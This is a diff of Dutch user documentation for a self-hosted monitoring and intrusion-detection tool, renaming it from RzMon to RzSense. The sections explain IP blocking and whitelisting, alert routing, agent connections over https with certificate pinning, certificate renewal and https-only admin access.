 - **Nieuwe sleutel:** de vorige blijft nog **24 uur** geldig. Elke agent krijgt de nieuwe bij zijn volgende rapport (versleuteld met de oude). Is een agent langer offline, dan gooit hij na 3 geweigerde rapporten zijn oude sleutel weg en haalt hij de nieuwe op (bij *Aan*); bij *Verplicht* geef je hem met `--key` opnieuw mee.
 - Zet *Verplicht* pas aan als 🔒 bij alle servers staat. Versleuteling komt **bovenop** HTTPS: het helpt vooral als agents via HTTP of een proxy verbinden, en het bewijst dat een rapport echt van een agent met de sleutel komt.
 
 **⛔ Blokkades** (tabblad *IDS → ⛔ Blokkades*, vanaf 1.92.0; of ⛔ *blokkeren* bij een melding) en de **✅ whitelist** (vanaf 1.162.0 bij *Instellingen → IDS → Netwerk en aanvallers → Whitelist*)
-- Een geblokkeerd **IP-adres** (`203.0.113.7`) of **netwerk** (`203.0.113.0/24`, ook IPv6) krijgt nergens meer toegang tot RzMon: niet de webpagina, niet het inloggen, niet de REST API en geen agents (HTTP 403). Per blokkade zie je hoe vaak hij iets tegenhield.
-- Jezelf (je huidige IP) en de RzMon-server kun je niet blokkeren. Toch buitengesloten? Op de server: `sudo php install/install.php --unblock-all`.
+- Een geblokkeerd **IP-adres** (`203.0.113.7`) of **netwerk** (`203.0.113.0/24`, ook IPv6) krijgt nergens meer toegang tot RzSense: niet de webpagina, niet het inloggen, niet de REST API en geen agents (HTTP 403). Per blokkade zie je hoe vaak hij iets tegenhield.
+- Jezelf (je huidige IP) en de RzSense-server kun je niet blokkeren. Toch buitengesloten? Op de server: `sudo php install/install.php --unblock-all`.
 - Dit is iets anders dan blokkeren door het IDS: dat gebeurt op de aangevallen server zelf.
-- **Overzicht (vanaf 1.83.0):** alles wat geblokkeerd is staat in één lijst. Dat zijn ⛔ IP-adressen in RzMon, 🔒 vergrendelde accounts en 🛡️ de IDS-blokkades per server (🌐 *alle servers* bij een automatische blokkade die op al je servers geldt).
+- **Overzicht (vanaf 1.83.0):** alles wat geblokkeerd is staat in één lijst. Dat zijn ⛔ IP-adressen in RzSense, 🔒 vergrendelde accounts en 🛡️ de IDS-blokkades per server (🌐 *alle servers* bij een automatische blokkade die op al je servers geldt).
   - Per regel zie je wat er geblokkeerd is, met het land, en waar. Ook de reden staat erbij, bij een honeypot met de honeypot-naam, met sinds en tot wanneer en door wie.
   - Er zijn twee tabbladen: **Nu geblokkeerd** en **Eerder**. *Eerder* toont wat opgeheven of verlopen is, met door wie. Dat blijft zo lang bewaard als de meldingen.
-  - Je kunt filteren op soort (*IP in RzMon · Accounts · IDS*) en zoeken op IP, naam, server of reden.
+  - Je kunt filteren op soort (*IP in RzSense · Accounts · IDS*) en zoeken op IP, naam, server of reden.
   - Bij IDS → Blokkades en bij een vergrendeld account onder *Gebruikers* staat een link hiernaartoe.
 - **🔓 Deblokkeren** werkt meteen. Bij het IDS past de agent zijn firewall binnen een minuut aan.
 - **✅ Whitelist** zet iets op de lijst *nooit blokkeren* en heft de blokkade meteen op. Je bevestigt met je wachtwoord (op het LAN typ je `WHITELIST`) en het komt in het auditlog. Je kiest hoe lang het geldt: **1 dag, 7 dagen, 30 dagen of altijd**.
-  - **IP-adres of netwerk** (hooguit een /16, bij IPv6 een /32): wordt nergens geblokkeerd. Niet bij het inloggen in RzMon en niet door het IDS op welke server dan ook, ook niet via de lijsten met bekende aanvallers. Je krijgt wel nog de meldingen. Valt het adres in een geblokkeerd netwerk, dan komt alleen dat adres erdoor.
+  - **IP-adres of netwerk** (hooguit een /16, bij IPv6 een /32): wordt nergens geblokkeerd. Niet bij het inloggen in RzSense en niet door het IDS op welke server dan ook, ook niet via de lijsten met bekende aanvallers. Je krijgt wel nog de meldingen. Valt het adres in een geblokkeerd netwerk, dan komt alleen dat adres erdoor.
   - **Account:** wordt nooit vergrendeld na mislukte logins. Het IP-adres van degene die het probeert wordt wél geblokkeerd. Zo kan niemand jou buitensluiten, en een aanvaller blijft buiten.
   - **Geen honeypot-naam:** de naam valt af van de honeypot-namen (op alle servers), bv. als *admin* bij jou een echte gebruiker is. Blokkades om die naam worden opgeheven.
   - **Voorbeeld:** je collega logt in vanaf een hotel (`198.51.100.23`) en tikt drie keer zijn wachtwoord fout. Zijn account en het IP-adres zijn geblokkeerd. Je klikt bij het account op **🔓 Deblokkeren** en bij het IP op **✅ Whitelist → 1 dag**. Morgen geldt het hotel-IP vanzelf weer als gewoon adres.
@@ -3562,58 +3564,58 @@ sudo -u apache php /var/www/rzmon/install/install.php --reset-2fa admin        #
 
 **Meldingen** (pagina *Meldingen*)
 - **⚠️ Niet-geautoriseerde verbinding** (warning, **altijd naar Pushover**, ook tijdens stille uren): een agent met een onbekend of fout token, een verkeerde sleutel of handtekening, een oud of opnieuw afgespeeld bericht, of onversleuteld terwijl het verplicht is; een verkeerde, verlopen of niet toegestane **API-sleutel**; en het aantal mislukte logins uit de **inlogbeveiliging** (standaard 3 binnen 10 minuten). Per IP en soort één melding (en één Pushover) per uur; daarna loopt de teller op (*4×*). Met **⛔ blokkeren** zet je het IP (of het netwerk) direct op de blokkadelijst.
-- **ℹ️ Logins in RzMon:** elke geslaagde login (wie, vanaf welk IP, welk apparaat, met wachtwoord, met 2FA of via een onthouden apparaat), en losse mislukte pogingen (per IP één regel per uur met een teller).
+- **ℹ️ Logins in RzSense:** elke geslaagde login (wie, vanaf welk IP, welk apparaat, met wachtwoord, met 2FA of via een onthouden apparaat), en losse mislukte pogingen (per IP één regel per uur met een teller).
 - **ℹ️ Agent verbonden:** als een agent voor het eerst verbindt, weer verbindt na stil te zijn geweest, of vanaf een ander IP-adres, met 🔒 of 🔓.
 - Waar deze meldingen heen gaan, kies je **per melding** bij *Instellingen → ℹ️ Systeeminfo* (zie hieronder).
 
 **ℹ️ Systeeminfo** (*Instellingen*, groep *Meldingen*, vanaf 1.59.0)
-- Een tabel met alle meldingen van RzMon zelf (geen checks): *RzMon bijgewerkt*; *Agent bijgewerkt*, *Agent bijwerken mislukt*, *Agent verbonden*; *Ingelogd*, *Mislukte login*; *Account geblokkeerd*, *Account gedeblokkeerd*, *IP geblokkeerd*, *Blokkade opgeheven*; *Nieuwe kwetsbaarheden*, *Pakketten bijgewerkt of mislukt*; *🔐 Certificaat verloopt binnenkort* (vanaf 1.68.0, zie § 10.2); *🔓 Datalek* en *🏠 Inlogpoging van buiten op een lokaal account* (vanaf 1.69.0, zie § 10.3); en ⚠️ *Niet-geautoriseerde verbinding*.
+- Een tabel met alle meldingen van RzSense zelf (geen checks): *RzSense bijgewerkt*; *Agent bijgewerkt*, *Agent bijwerken mislukt*, *Agent verbonden*; *Ingelogd*, *Mislukte login*; *Account geblokkeerd*, *Account gedeblokkeerd*, *IP geblokkeerd*, *Blokkade opgeheven*; *Nieuwe kwetsbaarheden*, *Pakketten bijgewerkt of mislukt*; *🔐 Certificaat verloopt binnenkort* (vanaf 1.68.0, zie § 10.2); *🔓 Datalek* en *🏠 Inlogpoging van buiten op een lokaal account* (vanaf 1.69.0, zie § 10.3); en ⚠️ *Niet-geautoriseerde verbinding*.
 - Per melding vink je aan: **📲 Pushover**, **📧 E-mail**, **🏠 Home Assistant** en **📄 Meldingenpagina**, en bij Pushover **🔕 stil** (zonder geluid) of **🔔 normaal**. Staat een kanaal helemaal uit, dan staat *(uit)* in de kop. Wordt meteen opgeslagen.
-- **Stille uren:** er gaat niets naar buiten, maar de melding komt wel op de meldingenpagina (als die aangevinkt is). Uitzondering: ⚠️ *Niet-geautoriseerde verbinding* gaat ook tijdens stille uren, en staat altijd op de meldingenpagina (daar telt RzMon de pogingen per IP).
+- **Stille uren:** er gaat niets naar buiten, maar de melding komt wel op de meldingenpagina (als die aangevinkt is). Uitzondering: ⚠️ *Niet-geautoriseerde verbinding* gaat ook tijdens stille uren, en staat altijd op de meldingenpagina (daar telt RzSense de pogingen per IP).
 - **🧪** stuurt een voorbeeld van die melding naar wat je nu aangevinkt hebt, ook tijdens stille uren.
 - Na de update naar 1.59.0 is alles ingesteld zoals het werkte. De rij **Info** bij de meldregels heet nu *Info (checks)* en geldt alleen nog voor checks (info-checks, herstart, certificaten). *Info bij agent-updates* per server (Agent Manager) blijft: staat dat uit, dan komen agent-updates van die server alleen op de meldingenpagina.
 
 #### 🌍 Agents via https, ander adres en reserve-adres (vanaf 1.72.0, agent 1.51.0)
-Agents kunnen RzMon via **https** bereiken, bijvoorbeeld via je reverse proxy (SWAG) met een Let's Encrypt-certificaat. Gebruik je intern en extern dezelfde naam (intern via een DNS-rewrite, bv. in AdGuard, extern via gewone DNS), dan werkt hetzelfde adres overal.
+Agents kunnen RzSense via **https** bereiken, bijvoorbeeld via je reverse proxy (SWAG) met een Let's Encrypt-certificaat. Gebruik je intern en extern dezelfde naam (intern via een DNS-rewrite, bv. in AdGuard, extern via gewone DNS), dan werkt hetzelfde adres overal.
 
 **Voorbereiding**
-1. Het IP-adres van de proxy staat bij *Instellingen → Beveiliging → Inloggen → Reverse proxy IP's*; alleen dan gelooft RzMon dat een verzoek via https binnenkwam.
-2. De proxy stuurt `/api.php` gewoon door naar RzMon (dat doet de standaard-config van SWAG al).
+1. Het IP-adres van de proxy staat bij *Instellingen → Beveiliging → Inloggen → Reverse proxy IP's*; alleen dan gelooft RzSense dat een verzoek via https binnenkwam.
+2. De proxy stuurt `/api.php` gewoon door naar RzSense (dat doet de standaard-config van SWAG al).
 3. Werk de agents bij naar **1.51.0** (de add-on via de add-on winkel).
 
-**Overstappen vanuit RzMon** (*Instellingen → 🖥️ Agents → Standaardinstellingen*)
-- **🌐 Alle agents naar een ander adres…** of per agent **🌐** in de tabel (of *Agent Manager → 🌍 Adres van RzMon → Wijzigen*).
+**Overstappen vanuit RzSense** (*Instellingen → 🖥️ Agents → Standaardinstellingen*)
+- **🌐 Alle agents naar een ander adres…** of per agent **🌐** in de tabel (of *Agent Manager → 🌍 Adres van RzSense → Wijzigen*).
 - Vul het **nieuwe adres** in (bv. `https://rzmon.example.nl`) en eventueel een **reserve-adres**. Leeg = het adres dat de agent nu gebruikt (bv. `http://192.168.1.10`); met *Geen reserve-adres* krijgt hij er geen.
 - De agent krijgt het adres **versleuteld** en **test het eerst**: verbinding, certificaat, en een antwoord dat met zijn eigen sleutel klopt. Pas dan gebruikt hij het. Lukt het niet, dan blijft het oude adres en zie je de reden (✘ …). Na één of twee rapporten staat in de kolom **Verbinding** *✔ Overgestapt naar …*.
 - Het adres staat op de server in de map met de sleutel (`/var/lib/rzmon-agent/url`; add-on: `/data/rzmon-keys/url`). Pas je `MONITOR_URL` in `/etc/default/rzmon-agent` zelf aan, dan geldt weer dat.
 - Agents ouder dan 1.51.0 worden overgeslagen; die pas je op de server zelf aan (`install-agent.sh --url …`).
-- **Mislukt met *nieuw IP-adres 86.x.x.x*?** Dan gaat die server via je **publieke IP** naar RzMon: de naam wijst daar niet naar je proxy, dus het verkeer gaat via je router naar buiten en weer naar binnen. Vanaf 1.72.1 (agent 1.51.1) staat dat er met een ⚠️ bij. Los het op in de DNS van die server, niet met *✔ Toestaan* (dan waarschuwt RzMon ook):
+- **Mislukt met *nieuw IP-adres 86.x.x.x*?** Dan gaat die server via je **publieke IP** naar RzSense: de naam wijst daar niet naar je proxy, dus het verkeer gaat via je router naar buiten en weer naar binnen. Vanaf 1.72.1 (agent 1.51.1) staat dat er met een ⚠️ bij. Los het op in de DNS van die server, niet met *✔ Toestaan* (dan waarschuwt RzSense ook):
   - **AdGuard Home:** een rewrite hoort bij het filteren. Staat de server bij *Clientinstellingen* met *Gebruik globale instelling* uit, zet dan **Domeinen blokkeren d.m.v. filters en host-bestanden** aan. Wis daarna de DNS-cache.
   - **Home Assistant:** `ha dns info` en `nslookup <naam>` in de *Terminal & SSH*-add-on; eventueel `ha dns options --fallback=false` en `ha dns restart`.
   - **Linux:** `getent hosts <naam>` moet het LAN-IP van de proxy geven; kijk anders in `/etc/resolv.conf` en `/etc/hosts`.
   - Klik daarna op **↺** bij de server (als je het publieke IP al had toegestaan) en doe **🌐** opnieuw.
 - Een ✘ verdwijnt vanzelf (*✔ Gebruikt nu …*) zodra de agent toch via dat adres rapporteert.
 
-**Kolom Verbinding:** 🔒 *https via proxy*, 🔒 *https*, 🔓 *http* of ⚠️ *via reserve-adres*, met het adres, ↪ het reserve-adres en de uitkomst van de laatste overstap. Achter elk adres staat hoe de agent het controleert (agent 1.53.0): 📌 het eigen certificaat van RzMon (vastgezet) of 🔒 een geldig certificaat.
+**Kolom Verbinding:** 🔒 *https via proxy*, 🔒 *https*, 🔓 *http* of ⚠️ *via reserve-adres*, met het adres, ↪ het reserve-adres en de uitkomst van de laatste overstap. Achter elk adres staat hoe de agent het controleert (agent 1.53.0): 📌 het eigen certificaat van RzSense (vastgezet) of 🔒 een geldig certificaat.
 
-**Reserve-adres:** is het gewone adres niet bereikbaar (geen verbinding, time-out, certificaatfout, of de proxy geeft 502, 503 of 504), dan stuurt de agent zijn rapport via het reserve-adres, opnieuw versleuteld. Vanaf 1.78.0 meldt RzMon dat pas als het **5 minuten** duurt, en **in één melding voor alle agents samen** (*⚠️ 12 agents via hun reserve-adres*, met de namen en het adres dat niet werkt). Een korte onderbreking, zoals een proxy die 's nachts wordt bijgewerkt, geeft dus geen meldingen. Zodra ze weer via hun gewone adres komen: één ✅-melding. Ook in te stellen met `--fallback` bij het installeren, `MONITOR_URL_FALLBACK=` in `/etc/default/rzmon-agent`, of *Reserve-adres* in de add-on.
+**Reserve-adres:** is het gewone adres niet bereikbaar (geen verbinding, time-out, certificaatfout, of de proxy geeft 502, 503 of 504), dan stuurt de agent zijn rapport via het reserve-adres, opnieuw versleuteld. Vanaf 1.78.0 meldt RzSense dat pas als het **5 minuten** duurt, en **in één melding voor alle agents samen** (*⚠️ 12 agents via hun reserve-adres*, met de namen en het adres dat niet werkt). Een korte onderbreking, zoals een proxy die 's nachts wordt bijgewerkt, geeft dus geen meldingen. Zodra ze weer via hun gewone adres komen: één ✅-melding. Ook in te stellen met `--fallback` bij het installeren, `MONITOR_URL_FALLBACK=` in `/etc/default/rzmon-agent`, of *Reserve-adres* in de add-on.
 
-**🔒 Agents alleen via https** (schakelaar op de kaart, en per agent *algemene instelling / aan / uit* in de tabel en de Agent Manager): een agent die via gewone http binnenkomt, wordt geweigerd (⚠️ *Niet-geautoriseerde verbinding*). Een rapport via het **reserve-adres** mag wel, met de ⚠️ hierboven, zodat je niets kwijtraakt als de proxy even plat ligt. Aanzetten kan pas als geen agent meer via http komt (RzMon noemt welke nog wel); uitzetten vraagt om bevestiging. *Hoe staat het ervoor?* toont *Agents via https*. Staat het aan en begint de *Basis-URL* met `http://`, dan gebruikt het installatiecommando in de Agent Manager hetzelfde adres met `https://`, met de vingerafdruk van het eigen certificaat van RzMon (`--pin`); een nieuwe agent komt zo meteen op https te staan (vanaf 1.130.0).
+**🔒 Agents alleen via https** (schakelaar op de kaart, en per agent *algemene instelling / aan / uit* in de tabel en de Agent Manager): een agent die via gewone http binnenkomt, wordt geweigerd (⚠️ *Niet-geautoriseerde verbinding*). Een rapport via het **reserve-adres** mag wel, met de ⚠️ hierboven, zodat je niets kwijtraakt als de proxy even plat ligt. Aanzetten kan pas als geen agent meer via http komt (RzSense noemt welke nog wel); uitzetten vraagt om bevestiging. *Hoe staat het ervoor?* toont *Agents via https*. Staat het aan en begint de *Basis-URL* met `http://`, dan gebruikt het installatiecommando in de Agent Manager hetzelfde adres met `https://`, met de vingerafdruk van het eigen certificaat van RzSense (`--pin`); een nieuwe agent komt zo meteen op https te staan (vanaf 1.130.0).
 
 #### 🔒 Lokaal via https, zonder proxy (vanaf 1.78.0, agent 1.53.0)
-Agents in je eigen netwerk kunnen ook **rechtstreeks via https** met RzMon praten, met het **eigen certificaat van RzMon** (poort 443), zonder nginx of SWAG. De agent **zet dat certificaat vast**: hij accepteert alleen precies dat certificaat (zoals Proxmox de *fingerprint* van een Proxmox Backup Server). Er komt niets in de trust store van de server.
+Agents in je eigen netwerk kunnen ook **rechtstreeks via https** met RzSense praten, met het **eigen certificaat van RzSense** (poort 443), zonder nginx of SWAG. De agent **zet dat certificaat vast**: hij accepteert alleen precies dat certificaat (zoals Proxmox de *fingerprint* van een Proxmox Backup Server). Er komt niets in de trust store van de server.
 
 **Zo werkt het**
-- RzMon kijkt **per adres** welk certificaat er staat en geeft de agent per adres door hoe hij het moet controleren: 📌 *vastzetten* (het eigen certificaat) of 🔒 *gewone controle* (een geldig certificaat, bv. Let's Encrypt via je proxy). Daardoor werken een rechtstreeks adres en een adres via de proxy samen als gewoon adres en reserve-adres.
+- RzSense kijkt **per adres** welk certificaat er staat en geeft de agent per adres door hoe hij het moet controleren: 📌 *vastzetten* (het eigen certificaat) of 🔒 *gewone controle* (een geldig certificaat, bv. Let's Encrypt via je proxy). Daardoor werken een rechtstreeks adres en een adres via de proxy samen als gewoon adres en reserve-adres.
 - Dat gaat altijd versleuteld met de eigen sleutel van de agent; niemand onderweg kan het vervangen.
 - Bij een overstap test de agent het nieuwe adres meteen mét de vingerafdruk.
 
-**Instellen** (*🌐 Alle agents naar een ander adres* of per agent *Agent Manager → 🌍 Adres van RzMon → Wijzigen*):
-- **Adres** en **Reserve-adres** kies je uit een lijst met wat RzMon zelf weet: de IP-adressen van RzMon (https en http), de naam die bij dat IP hoort (DNS), de hostnaam, extra namen uit het certificaat en je beheeradres. Of kies **✏️ Zelf invullen** (IP-adres of naam) en klik **Testen**.
-- Onder elk adres staat wat er op staat: 🔒📌 *het eigen certificaat van RzMon*, 🔒 *geldig certificaat*, 🔓 *http*, ✘ *onbekend certificaat* (dan weigert RzMon de overstap) of ⚠️ *vanaf RzMon niet bereikbaar*.
+**Instellen** (*🌐 Alle agents naar een ander adres* of per agent *Agent Manager → 🌍 Adres van RzSense → Wijzigen*):
+- **Adres** en **Reserve-adres** kies je uit een lijst met wat RzSense zelf weet: de IP-adressen van RzSense (https en http), de naam die bij dat IP hoort (DNS), de hostnaam, extra namen uit het certificaat en je beheeradres. Of kies **✏️ Zelf invullen** (IP-adres of naam) en klik **Testen**.
+- Onder elk adres staat wat er op staat: 🔒📌 *het eigen certificaat van RzSense*, 🔒 *geldig certificaat*, 🔓 *http*, ✘ *onbekend certificaat* (dan weigert RzSense de overstap) of ⚠️ *vanaf RzSense niet bereikbaar*.
 - **http mag ook**; dan zegt het venster het als *Alleen via https* voor die agents aan staat.
 - **Geen reserve-adres** zet het reserve-adres uit. Je kunt ook alleen het reserve-adres veranderen.
-- **Advies:** rechtstreeks (`https://<IP van RzMon>`) als gewoon adres en je beheeradres (`https://rzmon.jouwdomein.nl`, via de DNS-rewrite naar je proxy) als reserve. Dan hangen de agents niet af van je proxy en AdGuard. Andersom (de rewrite als gewoon adres) werkt ook.
+- **Advies:** rechtstreeks (`https://<IP van RzSense>`) als gewoon adres en je beheeradres (`https://rzmon.jouwdomein.nl`, via de DNS-rewrite naar je proxy) als reserve. Dan hangen de agents niet af van je proxy en AdGuard. Andersom (de rewrite als gewoon adres) werkt ook.
 - Voor het eigen certificaat is **agent 1.53.0** nodig; oudere agents worden overgeslagen. Een adres met een geldig certificaat werkt vanaf 1.51.0.
 - Agents buiten je netwerk (zoals een VPS) laat je gewoon op het externe adres, zonder reserve-adres.
 
@@ -3625,61 +3627,61 @@ Op de server staat de controle per adres in `/var/lib/rzmon-agent/url.pins` (add
 In de kaart **Beveiligde verbinding met de agents** staat de knop **🔐 Certificaat bekijken**. Het venster toont:
 - **het adres van de agents** (de Basis-URL) en wat dat betekent:
   - `http://…`: geen certificaat nodig; de berichten zijn al versleuteld met de eigen sleutel van elke agent;
-  - `https://<IP>`: het **eigen certificaat van RzMon** (poort 443);
+  - `https://<IP>`: het **eigen certificaat van RzSense** (poort 443);
   - `https://naam` via een reverse proxy: dat certificaat vernieuwt de proxy zelf;
-- het **eigen certificaat van RzMon**: uitgever, namen en IP-adressen, geldig van en tot, dagen nog geldig en de vingerafdruk;
+- het **eigen certificaat van RzSense**: uitgever, namen en IP-adressen, geldig van en tot, dagen nog geldig en de vingerafdruk;
 - de **vingerafdruk die de agents vastzetten** (📌), en **per agent** of hij het huidige certificaat al kent (✔) of het bij zijn volgende rapport krijgt (⏳).
 
-**⬇ Downloaden (.crt)** (met je wachtwoord): zet het certificaat in je browser of besturingssysteem als vertrouwd. Dan geeft `https://<IP van RzMon>` (ook de nooddeur) geen waarschuwing meer.
+**⬇ Downloaden (.crt)** (met je wachtwoord): zet het certificaat in je browser of besturingssysteem als vertrouwd. Dan geeft `https://<IP van RzSense>` (ook de nooddeur) geen waarschuwing meer.
 
 **🔄 Vernieuwen** (met je wachtwoord):
 - een nieuw certificaat met een **nieuwe sleutel**, **2 jaar** geldig;
 - met automatisch de hostnaam, `localhost`, alle IP-adressen van de server, het beheeradres en de Basis-URL; **extra namen of IP-adressen** vul je in het venster aan;
 - het oude certificaat blijft als reservekopie naast het origineel staan (`….rzmon-<datum>`); klopt de configuratie van de webserver daarna niet of mislukt herladen, dan wordt het oude teruggezet;
-- **agents gaan vanzelf mee**: hun vastgezette certificaat klopt niet meer, dus ze vragen RzMon opnieuw, controleren het antwoord met hun eigen sleutel, en onthouden pas dan de nieuwe vingerafdruk. Je hoeft niets opnieuw te koppelen;
-- **in twee stappen** (vanaf 1.78.0) als er agents (1.53.0+) zijn die het eigen certificaat vastzetten. RzMon **zet het nieuwe eerst klaar** (naast het oude, `….next`) en geeft de agents de nieuwe vingerafdruk erbij; ze accepteren dan het oude én het nieuwe. Zodra ze die **allemaal** hebben (uiterlijk na **7 dagen**) gaat RzMon het nieuwe gebruiken. Zo weigert geen enkele agent het certificaat. In het venster staat *Nieuw certificaat klaargezet* met per agent ✔ of ⏳, en de knoppen **Nu wisselen** en **Annuleren**. Met *Meteen wisselen* bij *Vernieuwen* sla je het klaarzetten over;
+- **agents gaan vanzelf mee**: hun vastgezette certificaat klopt niet meer, dus ze vragen RzSense opnieuw, controleren het antwoord met hun eigen sleutel, en onthouden pas dan de nieuwe vingerafdruk. Je hoeft niets opnieuw te koppelen;
+- **in twee stappen** (vanaf 1.78.0) als er agents (1.53.0+) zijn die het eigen certificaat vastzetten. RzSense **zet het nieuwe eerst klaar** (naast het oude, `….next`) en geeft de agents de nieuwe vingerafdruk erbij; ze accepteren dan het oude én het nieuwe. Zodra ze die **allemaal** hebben (uiterlijk na **7 dagen**) gaat RzSense het nieuwe gebruiken. Zo weigert geen enkele agent het certificaat. In het venster staat *Nieuw certificaat klaargezet* met per agent ✔ of ⏳, en de knoppen **Nu wisselen** en **Annuleren**. Met *Meteen wisselen* bij *Vernieuwen* sla je het klaarzetten over;
 - het werk gebeurt als root door de **hulpdienst** (`rzmon-cert.path`, geïnstalleerd door `install-helper.sh`, ook bij elke update met `install-rocky.sh`). Zonder hulpdienst, in de terminal:
   ```bash
   sudo php /var/www/rzmon/install/install.php --renew-cert             # met vastgezette agents: klaarzetten
   sudo php /var/www/rzmon/install/install.php --renew-cert --activate  # het klaargezette gaan gebruiken
   sudo php /var/www/rzmon/install/install.php --renew-cert --now       # meteen een nieuw certificaat
   ```
-  Zonder hulpdienst stuurt RzMon een ℹ️-melding met het commando zodra alle agents de nieuwe vingerafdruk hebben.
+  Zonder hulpdienst stuurt RzSense een ℹ️-melding met het commando zodra alle agents de nieuwe vingerafdruk hebben.
 - het werkt met de virtuele host van `install-rocky.sh` (`/etc/httpd/conf.d/rzmon.conf`). Bij een andere opstelling zet je de paden in `config.php`: `'ssl_cert' => '/pad/naar/cert.crt', 'ssl_key' => '/pad/naar/cert.key'`.
 
-RzMon controleert dit certificaat ook **elke dag**: ℹ️ 14 dagen voordat het verloopt, ⚠️ als het verlopen is.
+RzSense controleert dit certificaat ook **elke dag**: ℹ️ 14 dagen voordat het verloopt, ⚠️ als het verlopen is.
 
 ### 10.2 Beheer via https (vanaf 1.68.0)
 
 **Instellingen → Beveiliging → Beheer via https**
 
-Open je RzMon via `http://`, dan kan iemand op het netwerk je wachtwoord en je sessie zien, en de pagina onderweg veranderen (bijvoorbeeld de SHA of de koppelcode in een installatiecommando). Met deze kaart gaat de **webinterface altijd via https**. De agents en de REST API merken er niets van: hun berichten zijn al versleuteld (eigen sleutel) of hebben een API-sleutel, en ze mogen via http blijven werken.
+Open je RzSense via `http://`, dan kan iemand op het netwerk je wachtwoord en je sessie zien, en de pagina onderweg veranderen (bijvoorbeeld de SHA of de koppelcode in een installatiecommando). Met deze kaart gaat de **webinterface altijd via https**. De agents en de REST API merken er niets van: hun berichten zijn al versleuteld (eigen sleutel) of hebben een API-sleutel, en ze mogen via http blijven werken.
 
 #### Opzetten met SWAG en een DNS-rewrite
 1. **SWAG**: maak `nginx/proxy-confs/rzmon.subdomain.conf` (het voorbeeld staat op de kaart, onder *Zo zet je het op*) en herstart SWAG. SWAG vraagt het Let's Encrypt-certificaat zelf aan en vernieuwt het.
-2. **Vertrouwde proxy**: zet het LAN-IP van SWAG bij *Toegang → Geavanceerd → Reverse proxy IP's*. RzMon ziet dan het echte IP-adres van de bezoeker (`X-Forwarded-For`) en dat die via https kwam (`X-Forwarded-Proto`). Zet het **nooit** bij *Lokale netwerken*.
-3. **DNS-rewrite** in AdGuard Home (*Filters → DNS-herschrijvingen*): `rzmon.jouwdomein.nl` → het LAN-IP van SWAG. Thuis en onderweg gebruik je dan hetzelfde adres met hetzelfde geldige certificaat. Gebruikt de RzMon-server zelf ook AdGuard als DNS, dan kan RzMon het certificaat controleren (anders: een regel in `/etc/hosts` van de RzMon-server).
-4. Open RzMon via `https://rzmon.jouwdomein.nl`, vul dat in als **Beheeradres** en klik op **🔍 Nu controleren**.
+2. **Vertrouwde proxy**: zet het LAN-IP van SWAG bij *Toegang → Geavanceerd → Reverse proxy IP's*. RzSense ziet dan het echte IP-adres van de bezoeker (`X-Forwarded-For`) en dat die via https kwam (`X-Forwarded-Proto`). Zet het **nooit** bij *Lokale netwerken*.
+3. **DNS-rewrite** in AdGuard Home (*Filters → DNS-herschrijvingen*): `rzmon.jouwdomein.nl` → het LAN-IP van SWAG. Thuis en onderweg gebruik je dan hetzelfde adres met hetzelfde geldige certificaat. Gebruikt de RzSense-server zelf ook AdGuard als DNS, dan kan RzSense het certificaat controleren (anders: een regel in `/etc/hosts` van de RzSense-server).
+4. Open RzSense via `https://rzmon.jouwdomein.nl`, vul dat in als **Beheeradres** en klik op **🔍 Nu controleren**.
 
 Bovenaan de kaart zie je hoe je nu verbonden bent: http of https, via je vertrouwde proxy of niet, van binnen of van buiten, en of je op het beheeradres zit.
 
 #### Het certificaat
-De kaart toont van het beheeradres en van de **nooddeur** (zie hieronder): uitgever, namen, geldig van en tot, het aantal dagen dat het nog geldig is, de vingerafdruk (SHA-256) en of het vertrouwd is. Er staat ook waar de naam vanaf de RzMon-server naartoe wijst: intern (✔, de DNS-rewrite werkt) of naar je publieke IP (⚠️).
+De kaart toont van het beheeradres en van de **nooddeur** (zie hieronder): uitgever, namen, geldig van en tot, het aantal dagen dat het nog geldig is, de vingerafdruk (SHA-256) en of het vertrouwd is. Er staat ook waar de naam vanaf de RzSense-server naartoe wijst: intern (✔, de DNS-rewrite werkt) of naar je publieke IP (⚠️).
 
-RzMon controleert het certificaat **elke dag**:
+RzSense controleert het certificaat **elke dag**:
 - **ℹ️ info** in Meldingen (en de kanalen van *Systeeminfo → 🔐 Certificaat verloopt binnenkort*) **14 dagen** voor het verloopt. SWAG vernieuwt normaal rond 30 dagen van tevoren, dus deze melding betekent: vernieuwen lukt niet. Kijk dan in de log van SWAG.
 - **⚠️ warning** als het verlopen of ongeldig is (verkeerde naam, niet vertrouwd, geen verbinding), met de link naar de nooddeur. **✅** zodra het weer in orde is.
 
 #### Beheer alleen via https
-Zet de schakelaar aan **terwijl je RzMon via het beheeradres open hebt** en het certificaat in orde is; anders weigert RzMon (zo weet je zeker dat het werkt voordat http dicht gaat). Daarna:
+Zet de schakelaar aan **terwijl je RzSense via het beheeradres open hebt** en het certificaat in orde is; anders weigert RzSense (zo weet je zeker dat het werkt voordat http dicht gaat). Daarna:
 - gaat elke pagina via http naar het beheeradres (ook `http://LAN-IP` en de links uit meldingen);
-- stuurt RzMon **HSTS** mee: de browser probeert het daarna niet eens meer via http. De eerste **7 dagen** 1 dag (testfase); zonder problemen met het certificaat daarna vanzelf **1 jaar**. Zonder `includeSubDomains`, dus andere diensten op je domein merken er niets van;
+- stuurt RzSense **HSTS** mee: de browser probeert het daarna niet eens meer via http. De eerste **7 dagen** 1 dag (testfase); zonder problemen met het certificaat daarna vanzelf **1 jaar**. Zonder `includeSubDomains`, dus andere diensten op je domein merken er niets van;
 - blijven agents (`api.php?action=agent…`, `ping` en de downloads) en de REST API (`v1.php`) via http werken.
 
 Zet je het uit (met je wachtwoord), dan krijgt de browser het signaal HSTS te vergeten.
 
 #### De nooddeur 🚪
-`https://<IP-adres van RzMon>/` — het self-signed certificaat van RzMon zelf (`install-rocky.sh` zet dat op poort 443). Kies in de browser "toch doorgaan". De nooddeur werkt **alleen vanaf je interne netwerken**; van buiten word je naar het beheeradres gestuurd. HSTS geldt niet voor een IP-adres, dus ook met een verlopen certificaat op het beheeradres kom je zo altijd binnen.
+`https://<IP-adres van RzSense>/` — het self-signed certificaat van RzSense zelf (`install-rocky.sh` zet dat op poort 443). Kies in de browser "toch doorgaan". De nooddeur werkt **alleen vanaf je interne netwerken**; van buiten word je naar het beheeradres gestuurd. HSTS geldt niet voor een IP-adres, dus ook met een verlopen certificaat op het beheeradres kom je zo altijd binnen.
 
 **Buitengesloten?** Op de server:
 ```bash
@@ -3688,7 +3690,7 @@ sudo -u apache php /var/www/rzmon/install/install.php --https-off   # Debian: ww
 Dat zet *Beheer alleen via https* en *Inloggen via http weigeren* uit.
 
